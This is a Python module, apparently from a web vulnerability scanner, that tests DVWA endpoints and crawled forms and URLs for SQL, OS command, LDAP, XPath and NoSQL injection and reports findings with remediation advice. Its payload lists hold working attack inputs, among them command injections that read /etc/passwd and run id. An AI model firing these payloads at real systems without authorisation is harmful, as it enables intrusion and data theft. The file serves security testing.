"""
modules/injection.py
OWASP A03:2025 — Injection
Covers: SQL Injection (error-based, time-based, union-based, boolean-based)
        Command Injection
        LDAP Injection
        XPath Injection
        NoSQL Injection
"""

import re
import time
from typing import List, Dict, Tuple, Optional
from urllib.parse import urljoin, urlencode

from core.base_module import BaseModule
from core.finding import Finding
from core.crawler import DiscoveredUrl, DiscoveredForm


# ============================================================
#  PAYLOAD LIBRARIES
# ============================================================

# --- SQL Injection ---

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
    "1 AND 1=2",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "1; SELECT SLEEP(0)--",   # stacked, safe probe
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

SQLI_TIME_PAYLOADS = [
    # (payload_template, expected_delay_seconds)
    ("1' AND SLEEP({delay})--",         True,   "MySQL"),
    ("1; WAITFOR DELAY '0:0:{delay}'--", True,  "MSSQL"),
    ("1' AND pg_sleep({delay})--",      True,   "PostgreSQL"),
    ("1 AND 1=1 AND SLEEP({delay})--",  True,   "MySQL (no quote)"),
    ("1' OR SLEEP({delay})--",          True,   "MySQL OR"),
    ("' OR (SELECT * FROM (SELECT(SLEEP({delay})))a)--", True, "MySQL subquery"),
]

SQLI_UNION_PAYLOADS = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT 1,2,3-- -",
    "' UNION SELECT 1,2,3,4-- -",
    "' UNION ALL SELECT NULL-- -",
    "1 UNION SELECT user(),version(),database()-- -",
    "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
]

SQLI_BOOLEAN_PAYLOADS = [
    # (true_condition, false_condition)
    ("1' AND '1'='1",   "1' AND '1'='2"),
    ("1 AND 1=1",       "1 AND 1=2"),
    ("' OR 1=1-- -",    "' OR 1=2-- -"),
    ("admin'-- -",       "wronguser'-- -"),
]

SQLI_ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    # MSSQL
    r"unclosed quotation mark",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"syntax error converting",
    r"\[microsoft\]\[odbc",
    r"incorrect syntax near",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"unterminated quoted string",
    r"postgresql.*error",
    r"error:.*syntax error at or near",
    # Oracle
    r"ora-[0-9]{5}",
    r"oracle error",
    r"oracle.*driver",
    # SQLite
    r"sqlite[_ ]error",
    r"sqlite3::",
    # Generic
    r"sql syntax.*mysql",
    r"warning.*mysql",
    r"native client.*error",
    r"jdbc.*exception",
    r"sqlexception",
]

SQLI_DVWA_ENDPOINTS = [
    {
        "url": "/vulnerabilities/sqli/",
        "method": "GET",
        "params": {"id": "1", "Submit": "Submit"},
        "injectable_param": "id",
    },
    {
        "url": "/vulnerabilities/sqli_blind/",
        "method": "GET",
        "params": {"id": "1", "Submit": "Submit"},
        "injectable_param": "id",
    },
]

# --- Command Injection ---

CMD_PAYLOADS = {
    "unix": [
        "; id",
        "| id",
        "` id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(cat /etc/passwd)",
        "; whoami",
        "| whoami",
        "& id",
        "&& id",
        "\n id",
        "; ls -la",
        "| ls -la",
    ],
    "windows": [
        "& whoami",
        "| whoami",
        "&& whoami",
        "; whoami",
        "| dir",
        "& dir",
        "\r\n whoami",
    ],
}

CMD_SUCCESS_PATTERNS = [
    # Unix command output
    r"uid=\d+\(",           # id command
    r"root:|daemon:|www-data:",  # /etc/passwd
    r"total \d+\s+drwx",   # ls -la
    r"(?:^|\n)(?:root|www-data|apache|nginx|nobody)\s*$",  # whoami
    # Windows
    r"nt authority\\system",
    r"\\windows\\system32",
    r"volume in drive",
    r"directory of c:\\",
]

CMD_DVWA_ENDPOINTS = [
    {
        "url": "/vulnerabilities/exec/",
        "method": "POST",
        "params": {"ip": "127.0.0.1", "Submit": "Submit"},
        "injectable_param": "ip",
    },
]

# --- LDAP Injection ---

LDAP_PAYLOADS = [
    "*",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "*)(|(objectClass=*)",
    ")(|(password=*)",
    "*))(|(uid=*",
]

LDAP_ERROR_SIGNATURES = [
    r"ldap_bind",
    r"ldap_search",
    r"ldap_error",
    r"invalid dn syntax",
    r"ldap.*error",
    r"no such object",
    r"invalid filter",
]

# --- XPath Injection ---

XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "x' or 1=1 or 'x'='y",
    "' or count(parent::*)=1 or '1'='0",
    "' or name()='username' or '1'='2",
]

XPATH_ERROR_SIGNATURES = [
    r"xpath.*error",
    r"xmlxpathexception",
    r"xmlxpathcompiledexpr",
    r"invalid xpath",
    r"xpath query",
    r"unterminated string literal",
]

# --- NoSQL Injection ---

NOSQL_PAYLOADS_JSON = [
    {"$gt": ""},
    {"$ne": "invalid_value_xyz"},
    {"$regex": ".*"},
    {"$where": "1==1"},
]

NOSQL_PAYLOADS_PARAM = [
    "[$ne]=invalid",
    "[$gt]=",
    "[$regex]=.*",
]

NOSQL_ERROR_SIGNATURES = [
    r"mongodb",
    r"couchdb",
    r"bson",
    r"unexpected token",
    r"syntaxerror.*json",
    r'{"error"',
]


# ============================================================
#  MODULE CLASS
# ============================================================

class InjectionModule(BaseModule):
    MODULE_NAME = "injection"
    OWASP_CATEGORY = "A03"
    OWASP_NAME = "Injection"

    # Time-based SQLi parameters
    TIME_DELAY = 5          # seconds to sleep in time-based check
    TIME_THRESHOLD = 3.5    # minimum elapsed to consider a hit
    BASELINE_REPEATS = 2    # how many baseline measurements to average

    def run(
        self,
        urls: List[DiscoveredUrl],
        forms: List[DiscoveredForm],
    ) -> List[Finding]:

        self.log("[bold]Starting A03 Injection checks[/bold]")

        # 1. SQL Injection
        self._check_sqli_dvwa_known()
        self._check_sqli_urls(urls)
        self._check_sqli_forms(forms)

        # 2. Command Injection
        self._check_cmdi_dvwa_known()
        self._check_cmdi_forms(forms)

        # 3. LDAP Injection
        self._check_ldap_forms(forms)
        self._check_ldap_urls(urls)

        # 4. XPath Injection
        self._check_xpath_forms(forms)

        # 5. NoSQL Injection
        self._check_nosql_forms(forms)
        self._check_nosql_urls(urls)

        self.log(f"[green]A03 complete — {len(self.findings)} finding(s)[/green]")
        return self.findings

    # ============================================================
    #  SQL INJECTION
    # ============================================================

    def _check_sqli_dvwa_known(self):
        """Test known DVWA SQLi endpoints with full payload suite."""
        self.log("SQLi: testing DVWA known endpoints")
        for ep in SQLI_DVWA_ENDPOINTS:
            url = self.config.base_url + ep["url"]
            param = ep["injectable_param"]
            base_params = dict(ep["params"])

            # Error-based
            self._sqli_error_test(url, ep["method"], base_params, param)

            # Time-based (high-confidence confirmation)
            self._sqli_time_based_test(url, ep["method"], base_params, param)

            # Union-based
            if self.is_deep():
                self._sqli_union_test(url, ep["method"], base_params, param)

            # Boolean-based
            self._sqli_boolean_test(url, ep["method"], base_params, param)

    def _check_sqli_urls(self, urls: List[DiscoveredUrl]):
        """Test discovered parameterised URLs for SQL injection."""
        self.log(f"SQLi: testing {len(urls)} parameterised URLs")
        tested = set()
        for disc_url in urls:
            for param in disc_url.params:
                key = f"{disc_url.url}:{param}"
                if key in tested:
                    continue
                tested.add(key)

                base_params = dict(disc_url.params)
                self._sqli_error_test(disc_url.url, "GET", base_params, param)
                if self.is_deep():
                    self._sqli_time_based_test(disc_url.url, "GET", base_params, param)

    def _check_sqli_forms(self, forms: List[DiscoveredForm]):
        """Test discovered HTML forms for SQL injection."""
        self.log(f"SQLi: testing {len(forms)} forms")
        tested = set()
        for form in forms:
            for field in form.fields:
                if field.field_type in ("submit", "hidden", "button"):
                    continue
                key = f"{form.action}:{field.name}"
                if key in tested:
                    continue
                tested.add(key)

                base_data = {f.name: f.value for f in form.fields}
                self._sqli_error_test(
                    form.action, form.method, base_data, field.name
                )
                if self.is_deep():
                    self._sqli_time_based_test(
                        form.action, form.method, base_data, field.name
                    )

    def _sqli_error_test(self, url: str, method: str, params: dict, param: str):
        """Error-based SQL injection detection."""
        for payload in SQLI_ERROR_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload

            if method.upper() == "POST":
                resp = self.http.post(url, data=test_params)
            else:
                resp = self.http.get(url, params=test_params)

            if resp is None:
                continue

            matched_sig = self._match_sqli_error(resp.text)
            if matched_sig:
                req_snippet = self.build_request_snippet(method, url, 
                    params=test_params if method == "GET" else None,
                    data=test_params if method == "POST" else None)
                resp_snippet = self.truncate_response(resp.text)

                finding = Finding(
                    title=f"SQL Injection (Error-Based) — Parameter: {param}",
                    vulnerability_type="SQL Injection (Error-Based)",
                    owasp_category="A03",
                    owasp_name="Injection",
                    cwe_id="CWE-89",
                    severity="Critical",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"The parameter '{param}' at {url} is vulnerable to SQL injection. "
                        f"The server returned a database error signature matching: '{matched_sig}'. "
                        "An attacker can extract, modify, or delete database contents, "
                        "and potentially execute OS commands depending on the database and configuration."
                    ),
                    proof=(
                        f"Payload '{payload}' injected into parameter '{param}' "
                        f"triggered SQL error pattern: {matched_sig}"
                    ),
                    request_snippet=req_snippet,
                    response_snippet=resp_snippet,
                    remediation=(
                        "1. Use parameterized queries / prepared statements exclusively. "
                        "2. Never concatenate user input into SQL strings. "
                        "3. Apply least-privilege database accounts. "
                        "4. Implement Web Application Firewall (WAF) rules. "
                        "5. Suppress verbose database error messages in production."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                        "https://cwe.mitre.org/data/definitions/89.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="High",
                )
                self.add_finding(finding)
                return  # One confirmed finding per param is enough

    def _sqli_time_based_test(self, url: str, method: str, params: dict, param: str):
        """
        Time-based blind SQL injection — highest confidence approach.
        Measures baseline response time, then applies sleep payloads.
        """
        # Get baseline (average of BASELINE_REPEATS requests)
        baseline_times = []
        for _ in range(self.BASELINE_REPEATS):
            if method.upper() == "POST":
                _, t = self.http.post_with_timing(url, data=params)
            else:
                _, t = self.http.get_with_timing(url, params=params)
            if t > 0:
                baseline_times.append(t)

        if not baseline_times:
            return
        baseline = sum(baseline_times) / len(baseline_times)

        for payload_tpl, _, db_type in SQLI_TIME_PAYLOADS:
            payload = payload_tpl.format(delay=self.TIME_DELAY)
            test_params = dict(params)
            test_params[param] = payload

            if method.upper() == "POST":
                resp, elapsed = self.http.post_with_timing(url, data=test_params)
            else:
                resp, elapsed = self.http.get_with_timing(url, params=test_params)

            # Confirm: elapsed significantly > baseline AND >= threshold
            triggered = (
                elapsed >= self.TIME_THRESHOLD
                and elapsed >= (baseline + self.TIME_DELAY * 0.8)
            )

            if triggered:
                req_snippet = self.build_request_snippet(method, url,
                    params=test_params if method == "GET" else None,
                    data=test_params if method == "POST" else None)
                resp_snippet = self.truncate_response(resp.text if resp else "")

                finding = Finding(
                    title=f"SQL Injection (Time-Based Blind) — Parameter: {param}",
                    vulnerability_type="SQL Injection (Time-Based Blind)",
                    owasp_category="A03",
                    owasp_name="Injection",
                    cwe_id="CWE-89",
                    severity="Critical",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"The parameter '{param}' is vulnerable to time-based blind SQL injection "
                        f"(suspected {db_type}). "
                        f"Baseline response: {baseline:.2f}s. "
                        f"With SLEEP({self.TIME_DELAY}) payload, response took {elapsed:.2f}s. "
                        "An attacker can exfiltrate the entire database contents character by character."
                    ),
                    proof=(
                        f"SLEEP({self.TIME_DELAY}) payload caused {elapsed:.2f}s delay "
                        f"vs {baseline:.2f}s baseline (threshold: {self.TIME_THRESHOLD}s). "
                        f"Database type: {db_type}"
                    ),
                    request_snippet=req_snippet,
                    response_snippet=resp_snippet,
                    remediation=(
                        "1. Use parameterized queries exclusively — never build SQL by concatenation. "
                        "2. Implement input validation and allowlisting for numeric parameters. "
                        "3. Apply database query timeouts at the application level. "
                        "4. Least-privilege DB accounts — no SLEEP/WAITFOR permission where possible."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        "https://portswigger.net/web-security/sql-injection/blind",
                        "https://cwe.mitre.org/data/definitions/89.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="High",
                )
                self.add_finding(finding)
                return  # One confirmed per param

    def _sqli_union_test(self, url: str, method: str, params: dict, param: str):
        """Union-based SQL injection — look for data extraction indicators."""
        for payload in SQLI_UNION_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload

            if method.upper() == "POST":
                resp = self.http.post(url, data=test_params)
            else:
                resp = self.http.get(url, params=test_params)

            if resp is None:
                continue

            # Look for DB version strings, table names, or column markers
            union_indicators = [
                r"\d+\.\d+\.\d+-mysql",         # MySQL version
                r"postgresql \d+\.\d+",          # Postgres version
                r"microsoft sql server \d{4}",  # MSSQL version
                r"information_schema",
                r"table_name",
                r"column_name",
            ]
            for pattern in union_indicators:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    req_snippet = self.build_request_snippet(method, url,
                        params=test_params if method == "GET" else None,
                        data=test_params if method == "POST" else None)

                    finding = Finding(
                        title=f"SQL Injection (UNION-Based) — Parameter: {param}",
                        vulnerability_type="SQL Injection (UNION-Based)",
                        owasp_category="A03",
                        owasp_name="Injection",
                        cwe_id="CWE-89",
                        severity="Critical",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        url=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"UNION-based SQL injection confirmed in parameter '{param}'. "
                            "The UNION SELECT payload returned database metadata in the response, "
                            "indicating the application echoes query results directly."
                        ),
                        proof=f"Pattern '{pattern}' found in response to UNION payload.",
                        request_snippet=req_snippet,
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "Implement parameterized queries. Never concatenate user input into SQL. "
                            "Ensure database errors and raw query results are not exposed in responses."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://portswigger.net/web-security/sql-injection/union-attacks",
                        ],
                        module=self.MODULE_NAME,
                        confidence="High",
                    )
                    self.add_finding(finding)
                    return

    def _sqli_boolean_test(self, url: str, method: str, params: dict, param: str):
        """
        Boolean-based blind SQLi — compare True-condition vs False-condition responses.
        Different content length or content = likely injectable.
        """
        for true_payload, false_payload in SQLI_BOOLEAN_PAYLOADS:
            true_params = dict(params)
            true_params[param] = true_payload
            false_params = dict(params)
            false_params[param] = false_payload

            if method.upper() == "POST":
                r_true  = self.http.post(url, data=true_params)
                r_false = self.http.post(url, data=false_params)
            else:
                r_true  = self.http.get(url, params=true_params)
                r_false = self.http.get(url, params=false_params)

            if r_true is None or r_false is None:
                continue

            len_diff = abs(len(r_true.text) - len(r_false.text))
            # Significant length difference and non-trivially sized responses
            if len_diff > 50 and len(r_true.text) > 100:
                req_snippet = self.build_request_snippet(method, url,
                    params=true_params if method == "GET" else None,
                    data=true_params if method == "POST" else None)

                finding = Finding(
                    title=f"SQL Injection (Boolean-Based Blind) — Parameter: {param}",
                    vulnerability_type="SQL Injection (Boolean-Based Blind)",
                    owasp_category="A03",
                    owasp_name="Injection",
                    cwe_id="CWE-89",
                    severity="Critical",
                    cvss_score=9.0,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    method=method,
                    parameter=param,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    description=(
                        f"Boolean-based blind SQL injection in parameter '{param}'. "
                        f"TRUE condition response length: {len(r_true.text)}, "
                        f"FALSE condition: {len(r_false.text)} (delta: {len_diff}). "
                        "Attacker can exfiltrate data bit by bit using conditional queries."
                    ),
                    proof=(
                        f"Response length differs by {len_diff} bytes between "
                        f"TRUE ('{true_payload}') and FALSE ('{false_payload}') conditions."
                    ),
                    request_snippet=req_snippet,
                    response_snippet=self.truncate_response(r_true.text),
                    remediation=(
                        "Use parameterized queries. Validate and sanitize all user inputs. "
                        "Consider using an ORM with built-in injection prevention."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        "https://cwe.mitre.org/data/definitions/89.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="Medium",
                )
                self.add_finding(finding)
                return

    def _match_sqli_error(self, text: str) -> Optional[str]:
        """Return the first matching SQL error signature, or None."""
        text_lower = text.lower()
        for sig in SQLI_ERROR_SIGNATURES:
            if re.search(sig, text_lower):
                return sig
        return None

    # ============================================================
    #  COMMAND INJECTION
    # ============================================================

    def _check_cmdi_dvwa_known(self):
        """Test DVWA's known command execution endpoint."""
        self.log("CmdI: testing DVWA known exec endpoint")
        for ep in CMD_DVWA_ENDPOINTS:
            url = self.config.base_url + ep["url"]
            param = ep["injectable_param"]
            base_data = dict(ep["params"])
            self._cmdi_test(url, ep["method"], base_data, param)

    def _check_cmdi_forms(self, forms: List[DiscoveredForm]):
        """Test forms for command injection (heuristic: ip/host/cmd fields)."""
        self.log(f"CmdI: testing forms")
        cmd_field_patterns = re.compile(
            r"(ip|host|ping|cmd|exec|command|target|addr|address|url|path)", re.IGNORECASE
        )
        tested = set()
        for form in forms:
            for field in form.fields:
                if not cmd_field_patterns.search(field.name):
                    continue
                key = f"{form.action}:{field.name}"
                if key in tested:
                    continue
                tested.add(key)
                base_data = {f.name: f.value for f in form.fields}
                self._cmdi_test(form.action, form.method, base_data, field.name)

    def _cmdi_test(self, url: str, method: str, params: dict, param: str):
        """Run command injection payloads and check for OS command output."""
        all_payloads = CMD_PAYLOADS["unix"] + (CMD_PAYLOADS["windows"] if self.is_deep() else [])
        for payload in all_payloads:
            test_params = dict(params)
            # Append to existing value (e.g., "127.0.0.1; id")
            base_val = test_params.get(param, "127.0.0.1")
            test_params[param] = base_val + payload

            if method.upper() == "POST":
                resp = self.http.post(url, data=test_params)
            else:
                resp = self.http.get(url, params=test_params)

            if resp is None:
                continue

            for pattern in CMD_SUCCESS_PATTERNS:
                match = re.search(pattern, resp.text, re.IGNORECASE | re.MULTILINE)
                if match:
                    req_snippet = self.build_request_snippet(method, url,
                        params=test_params if method == "GET" else None,
                        data=test_params if method == "POST" else None)

                    finding = Finding(
                        title=f"OS Command Injection — Parameter: {param}",
                        vulnerability_type="OS Command Injection",
                        owasp_category="A03",
                        owasp_name="Injection",
                        cwe_id="CWE-78",
                        severity="Critical",
                        cvss_score=10.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                        url=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"OS Command Injection confirmed in parameter '{param}'. "
                            f"The payload '{payload}' caused OS command output to appear in the response. "
                            "An attacker has full OS-level code execution capability."
                        ),
                        proof=(
                            f"Pattern '{pattern}' matched in response: "
                            f"'{match.group(0)[:100]}'"
                        ),
                        request_snippet=req_snippet,
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "1. NEVER pass user-supplied input to OS shell commands. "
                            "2. If OS commands are necessary, use language-native APIs that avoid shell invocation. "
                            "3. Implement strict allowlist input validation. "
                            "4. Run the application with least-privilege OS accounts. "
                            "5. Use containers/sandboxes to limit blast radius."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Command_Injection",
                            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                            "https://cwe.mitre.org/data/definitions/78.html",
                        ],
                        module=self.MODULE_NAME,
                        confidence="High",
                    )
                    self.add_finding(finding)
                    return

    # ============================================================
    #  LDAP INJECTION
    # ============================================================

    def _check_ldap_forms(self, forms: List[DiscoveredForm]):
        self.log("LDAP: scanning forms")
        ldap_patterns = re.compile(r"(user|username|login|uid|cn|dn|search|query)", re.IGNORECASE)
        for form in forms:
            for field in form.fields:
                if not ldap_patterns.search(field.name):
                    continue
                base_data = {f.name: f.value for f in form.fields}
                self._ldap_test(form.action, form.method, base_data, field.name)

    def _check_ldap_urls(self, urls: List[DiscoveredUrl]):
        self.log("LDAP: scanning URL params")
        ldap_patterns = re.compile(r"(user|username|login|uid|cn|dn|search|q)", re.IGNORECASE)
        for disc_url in urls:
            for param in disc_url.params:
                if not ldap_patterns.search(param):
                    continue
                self._ldap_test(disc_url.url, "GET", dict(disc_url.params), param)

    def _ldap_test(self, url: str, method: str, params: dict, param: str):
        for payload in LDAP_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload

            if method.upper() == "POST":
                resp = self.http.post(url, data=test_params)
            else:
                resp = self.http.get(url, params=test_params)

            if resp is None:
                continue

            text_lower = resp.text.lower()
            for sig in LDAP_ERROR_SIGNATURES:
                if re.search(sig, text_lower):
                    finding = Finding(
                        title=f"LDAP Injection — Parameter: {param}",
                        vulnerability_type="LDAP Injection",
                        owasp_category="A03",
                        owasp_name="Injection",
                        cwe_id="CWE-90",
                        severity="High",
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                        url=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"LDAP injection detected in parameter '{param}'. "
                            f"The server returned an LDAP error signature: '{sig}'. "
                            "An attacker may be able to bypass authentication or extract directory data."
                        ),
                        proof=f"LDAP error pattern '{sig}' triggered by payload '{payload}'",
                        request_snippet=self.build_request_snippet(method, url,
                            params=test_params if method=="GET" else None,
                            data=test_params if method=="POST" else None),
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "1. Escape special LDAP characters in all user input. "
                            "2. Use LDAP-safe query APIs / prepared LDAP queries. "
                            "3. Suppress LDAP error details in responses."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/LDAP_Injection",
                            "https://cwe.mitre.org/data/definitions/90.html",
                        ],
                        module=self.MODULE_NAME,
                        confidence="Medium",
                    )
                    self.add_finding(finding)
                    return

    # ============================================================
    #  XPATH INJECTION
    # ============================================================

    def _check_xpath_forms(self, forms: List[DiscoveredForm]):
        self.log("XPath: scanning forms")
        for form in forms:
            for field in form.fields:
                if field.field_type in ("submit", "button", "hidden"):
                    continue
                base_data = {f.name: f.value for f in form.fields}
                self._xpath_test(form.action, form.method, base_data, field.name)

    def _xpath_test(self, url: str, method: str, params: dict, param: str):
        for payload in XPATH_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload

            if method.upper() == "POST":
                resp = self.http.post(url, data=test_params)
            else:
                resp = self.http.get(url, params=test_params)

            if resp is None:
                continue

            text_lower = resp.text.lower()
            for sig in XPATH_ERROR_SIGNATURES:
                if re.search(sig, text_lower):
                    finding = Finding(
                        title=f"XPath Injection — Parameter: {param}",
                        vulnerability_type="XPath Injection",
                        owasp_category="A03",
                        owasp_name="Injection",
                        cwe_id="CWE-643",
                        severity="High",
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                        url=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"XPath injection in parameter '{param}'. "
                            "Attacker can manipulate XML database queries."
                        ),
                        proof=f"XPath error signature '{sig}' triggered.",
                        request_snippet=self.build_request_snippet(method, url,
                            params=test_params if method=="GET" else None,
                            data=test_params if method=="POST" else None),
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "Escape XPath special characters or use parameterized XPath APIs. "
                            "Suppress detailed XML/XPath errors from responses."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/XPATH_Injection",
                            "https://cwe.mitre.org/data/definitions/643.html",
                        ],
                        module=self.MODULE_NAME,
                        confidence="Medium",
                    )
                    self.add_finding(finding)
                    return

    # ============================================================
    #  NoSQL INJECTION
    # ============================================================

    def _check_nosql_forms(self, forms: List[DiscoveredForm]):
        self.log("NoSQLi: scanning forms")
        for form in forms:
            base_data = {f.name: f.value for f in form.fields}
            for field in form.fields:
                if field.field_type in ("submit", "button"):
                    continue
                self._nosql_param_test(form.action, form.method, base_data, field.name)

    def _check_nosql_urls(self, urls: List[DiscoveredUrl]):
        self.log("NoSQLi: scanning URL params")
        for disc_url in urls:
            for param in disc_url.params:
                self._nosql_param_test(disc_url.url, "GET", dict(disc_url.params), param)

    def _nosql_param_test(self, url: str, method: str, params: dict, param: str):
        """Test parameter-based NoSQL injection (e.g., MongoDB operator injection)."""
        for suffix in NOSQL_PAYLOADS_PARAM:
            # Test as param[operator]=value style
            modified_params = {k: v for k, v in params.items() if k != param}
            modified_params[f"{param}{suffix.split('=')[0]}"] = suffix.split("=", 1)[1]

            if method.upper() == "POST":
                resp = self.http.post(url, data=modified_params)
            else:
                resp = self.http.get(url, params=modified_params)

            if resp is None:
                continue

            text_lower = resp.text.lower()
            for sig in NOSQL_ERROR_SIGNATURES:
                if re.search(sig, text_lower):
                    finding = Finding(
                        title=f"NoSQL Injection — Parameter: {param}",
                        vulnerability_type="NoSQL Injection",
                        owasp_category="A03",
                        owasp_name="Injection",
                        cwe_id="CWE-943",
                        severity="High",
                        cvss_score=8.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                        url=url,
                        method=method,
                        parameter=param,
                        payload=suffix,
                        description=(
                            f"NoSQL injection detected in parameter '{param}'. "
                            "MongoDB operator injection can bypass authentication and extract data."
                        ),
                        proof=f"NoSQL error signature '{sig}' triggered by operator payload.",
                        request_snippet=self.build_request_snippet(method, url,
                            params=modified_params if method=="GET" else None,
                            data=modified_params if method=="POST" else None),
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "1. Sanitize and validate all inputs before passing to NoSQL queries. "
                            "2. Use schema validation (e.g., Mongoose). "
                            "3. Avoid directly passing user-supplied objects as query filters."
                        ),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                            "https://cwe.mitre.org/data/definitions/943.html",
                        ],
                        module=self.MODULE_NAME,
                        confidence="Medium",
                    )
                    self.add_finding(finding)
                    return